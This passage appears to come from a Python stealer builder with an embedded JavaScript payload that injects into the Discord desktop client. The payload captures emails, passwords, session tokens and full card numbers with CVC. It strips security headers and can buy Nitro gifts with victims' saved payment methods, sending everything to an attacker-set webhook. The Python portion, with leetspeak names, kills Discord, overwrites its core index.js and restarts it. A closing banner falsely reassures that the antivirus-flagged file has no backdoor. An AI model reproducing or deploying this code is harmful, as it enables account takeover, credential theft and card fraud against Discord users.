  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def Di5c0rd_inj3c710n():
    import os
    import re
    import subprocess
    import psutil

    def g3t_c0r3(v4r_dir):
        for v4r_file in os.listdir(v4r_dir):
            if re.search(r'app-+?', v4r_file):
                v4r_modules = v4r_dir + '\\' + v4r_file + '\\modules'
                if not os.path.exists(v4r_modules):
                    continue
                for v4r_file in os.listdir(v4r_modules):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        v4r_core = v4r_modules + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return v4r_core, v4r_file
        return None

    def st4rt_d15c0rd(v4r_dir):
        v4r_update = v4r_dir + '\\Update.exe'
        v4r_executable = v4r_dir.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(v4r_dir):
            if re.search(r'app-+?', v4r_file):
                v4r_app = v4r_dir + '\\' + v4r_file
                if os.path.exists(v4r_app + '\\' + 'modules'):
                    for v4r_file in os.listdir(v4r_app):
                        if v4r_file == v4r_executable:
                            v4r_executable = v4r_app + '\\' + v4r_executable
                            subprocess.call([v4r_update, '--processStart', v4r_executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def inj3ct_c0d3():
        v4r_appdata = os.getenv('LOCALAPPDATA')
        v4r_discord_dirs = [
            v4r_appdata + '\\Discord',
            v4r_appdata + '\\DiscordCanary',
            v4r_appdata + '\\DiscordPTB',
            v4r_appdata + '\\DiscordDevelopment'
        ]
        v4r_code = v4r_inj3c710n_c0d3

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for v4r_dir in v4r_discord_dirs:
            if not os.path.exists(v4r_dir):
                continue

            v4r_core_info = g3t_c0r3(v4r_dir)
            if v4r_core_info is not None:
                v4r_core, v4r_core_file = v4r_core_info
                
                v4r_index_js_path = v4r_core + '\\index.js'
                
                if not os.path.exists(v4r_index_js_path):
                    open(v4r_index_js_path, 'w').close()

                with open(v4r_index_js_path, 'w', encoding='utf-8') as f:
                    f.write((v4r_code).replace('discord_desktop_core-1', v4r_core_file)
                            .replace(r"%WEBHOOK_HERE%", v4r_w3bh00k_ur1)
                            .replace(r"%EMBED_COLOR%", str(v4r_color_embed))
                            .replace(r"%USERNAME%", v4r_username_pc)
                            .replace(r"%IP_PUBLIC%", v4r_ip_address_public)
                            .replace(r"%EMBED_NAME%", v4r_username_embed)
                            .replace(r"%EMBED_ICON%", v4r_avatar_embed)
                            .replace(r"%FOOTER_TEXT%", v4r_footer_text)
                            .replace(r"%WEBSITE%", v4r_website))
                st4rt_d15c0rd(v4r_dir)
    inj3ct_c0d3()
'''

#    ╔════════════════════════════════════════════════════════════════════════════╗
#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
#    ╚════════════════════════════════════════════════════════════════════════════╝